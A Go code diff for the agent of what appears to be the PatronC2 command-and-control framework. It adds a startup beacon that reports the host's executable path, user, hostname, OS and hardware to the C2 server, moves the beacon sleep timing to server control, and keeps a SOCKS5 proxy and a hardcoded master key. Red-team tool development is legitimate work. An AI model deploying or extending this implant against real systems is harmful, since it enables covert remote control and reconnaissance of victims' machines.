@@ -9,8 +9,8 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io"
-	"math/rand"
 	"net"
+	"os"
 	"os/exec"
 	"os/user"
 	"runtime"
@@ -21,7 +21,6 @@ import (
 
 	fqdn "github.com/Showmax/go-fqdn"
 	"github.com/armon/go-socks5"
-	"github.com/google/uuid"
 	"github.com/quic-go/quic-go"
 	"github.com/shirou/gopsutil/v4/host"
 	"github.com/shirou/gopsutil/v4/mem"
@@ -29,7 +28,6 @@ import (
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
-	"github.com/PatronC2/Patron/types"
 )
 
 type Config struct {
@@ -90,8 +88,7 @@ func LoadCertificate(RootCert, transport string) (*tls.Config, error) {
 	return config, nil
 }
 
-func GenerateAgentMetadata() (string, string, string) {
-	agentID := uuid.New().String()
+func GenerateAgentMetadata() (string, string) {
 	var hostname string
 	var username string
 
@@ -105,7 +102,20 @@ func GenerateAgentMetadata() (string, string, string) {
 		logger.Logf(logger.Error, "Error generating agent metadata: %v", err)
 	}
 
-	return agentID, hostname, username
+	return hostname, username
+}
+
+func GetExecutablePath() string {
+	path, err := os.Executable()
+	if err != nil {
+		logger.Logf(logger.Error, "Error fetching executable path: %v", err)
+		return "unknown"
+	}
+	return path
+}
+
+func DefaultCapabilities() []string {
+	return []string{"commands", "files"}
 }
 
 func getHostname() (string, error) {
@@ -294,20 +304,6 @@ func HandleError(beacon io.ReadWriteCloser, reqType string, err error) {
 	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
 	beacon.Close()
 	time.Sleep(2 * time.Second)
-}
-
-func CalculateNextCallbackTime(callbackFrequency string, callbackJitter string) time.Time {
-	r := rand.New(rand.NewSource(time.Now().UnixNano()))
-	frequency, _ := strconv.Atoi(callbackFrequency)
-	jitter, _ := strconv.Atoi(callbackJitter)
-
-	baseTime := float64(frequency)
-	jitterPercent := float64(jitter) * 0.01
-	variance := baseTime * jitterPercent * r.Float64()
-
-	finalInterval := baseTime - (jitterPercent * baseTime) + 2*variance
-
-	return time.Now().UTC().Add(time.Duration(finalInterval * float64(time.Second)))
 }
 
 func GetOSInfo() (string, string, string, string, string) {
@@ -506,79 +502,95 @@ func (p *ProxyServer) StopProxy() {
 	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
 }
 
-func HandleConfigurationRequest(beacon io.ReadWriteCloser, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, serverIP, serverPort, callbackFrequency, callbackJitter string, nextCallback time.Time, transportProtocol string) error {
+func HandleStartupRequest(beacon io.ReadWriteCloser, filepath, hostname, username, ip, osType, osArch, osVersion, cpus, memory string, capabilities []string) (string, error) {
+	req := &patronobuf.Request{
+		Type: patronobuf.RequestType_STARTUP,
+		Payload: &patronobuf.Request_Startup{
+			Startup: &patronobuf.StartupRequest{
+				Filepath:     filepath,
+				Username:     username,
+				Hostname:     hostname,
+				Ostype:       osType,
+				Arch:         osArch,
+				Osbuild:      osVersion,
+				Cpus:         cpus,
+				Memory:       memory,
+				Agentip:      ip,
+				Capabilities: capabilities,
+			},
+		},
+	}
+
+	if err := common.WriteDelimited(beacon, req); err != nil {
+		return "", err
+	}
+
+	resp := &patronobuf.Response{}
+	if err := common.ReadDelimited(beacon, resp); err != nil {
+		return "", err
+	}
+
+	if resp.Type != patronobuf.ResponseType_STARTUP_RESPONSE {
+		return "", fmt.Errorf("unexpected response type: %v", resp.Type)
+	}
+
+	startup := resp.GetStartupResponse()
+	if startup == nil || startup.GetUuid() == "" {
+		return "", fmt.Errorf("missing startup response UUID")
+	}
+
+	return startup.GetUuid(), nil
+}
+
+func HandleConfigurationRequest(beacon io.ReadWriteCloser, agentID, serverIP, serverPort, callbackFrequency, callbackJitter string, transportProtocol string) (time.Duration, error) {
 	req := &patronobuf.Request{
 		Type: patronobuf.RequestType_CONFIGURATION,
 		Payload: &patronobuf.Request_Configuration{
 			Configuration: &patronobuf.ConfigurationRequest{
 				Uuid:              agentID,
-				Username:          username,
-				Hostname:          hostname,
-				Ostype:            osType,
-				Arch:              osArch,
-				Osbuild:           osVersion,
-				Cpus:              cpus,
-				Memory:            memory,
-				Agentip:           ip,
 				Serverip:          serverIP,
 				Serverport:        serverPort,
 				Callbackfrequency: callbackFrequency,
 				Callbackjitter:    callbackJitter,
 				Masterkey:         "MASTERKEY",
-				NextcallbackUnix:  nextCallback.Unix(),
 				Transportprotocol: transportProtocol,
 			},
 		},
 	}
 
 	if err := common.WriteDelimited(beacon, req); err != nil {
-		return err
+		return 0, err
 	}
 
 	resp := &patronobuf.Response{}
 	if err := common.ReadDelimited(beacon, resp); err != nil {
-		return err
+		return 0, err
 	}
 
 	if resp.Type != patronobuf.ResponseType_CONFIGURATION_RESPONSE {
-		return fmt.Errorf("unexpected response type: %v", resp.Type)
+		return 0, fmt.Errorf("unexpected response type: %v", resp.Type)
 	}
 
 	conf := resp.GetConfigurationResponse()
 	if conf == nil {
-		return fmt.Errorf("missing configuration response payload")
+		return 0, fmt.Errorf("missing configuration response payload")
 	}
 
-	UpdateClientConfig(conf, serverIP, serverPort, callbackFrequency, callbackJitter, transportProtocol)
-	return nil
-}
-
-func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time, transportProtocol string) types.ConfigurationRequest {
-	return types.ConfigurationRequest{
-		AgentID:           agentID,
-		Username:          username,
-		Hostname:          hostname,
-		OSType:            osType,
-		OSArch:            osArch,
-		OSBuild:           osVersion,
-		CPUS:              cpus,
-		MEMORY:            memory,
-		AgentIP:           ip,
-		ServerIP:          ServerIP,
-		ServerPort:        ServerPort,
-		CallbackFrequency: CallbackFrequency,
-		CallbackJitter:    CallbackJitter,
-		NextCallback:      nextCallback,
-		MasterKey:         "MASTERKEY",
-		TransportProtocol: transportProtocol,
+	if conf.GetServerip() == "" || conf.GetServerport() == "" || conf.GetTransportprotocol() == "" {
+		return 0, fmt.Errorf("configuration response has empty required fields: serverip=%q serverport=%q transportprotocol=%q",
+			conf.GetServerip(), conf.GetServerport(), conf.GetTransportprotocol())
 	}
+	if conf.GetSleepSeconds() <= 0 {
+		return 0, fmt.Errorf("configuration response has non-positive sleep duration: %d", conf.GetSleepSeconds())
+	}
+
+	UpdateClientConfig(conf, serverIP, serverPort, transportProtocol)
+	return time.Duration(conf.GetSleepSeconds()) * time.Second, nil
 }
 
-func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, callbackFrequency, callbackJitter, transportProtocol string) {
+func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, transportProtocol string) {
 	UpdateConfigField(ClientConfig.ServerIP, config.GetServerip(), "callback IP")
 	UpdateConfigField(ClientConfig.ServerPort, config.GetServerport(), "callback port")
-	UpdateConfigField(ClientConfig.CallbackFrequency, config.GetCallbackfrequency(), "callback frequency")
-	UpdateConfigField(ClientConfig.CallbackJitter, config.GetCallbackjitter(), "callback jitter")
 	UpdateConfigField(ClientConfig.TransportProtocol, config.GetTransportprotocol(), "transport protocol")
 }
 
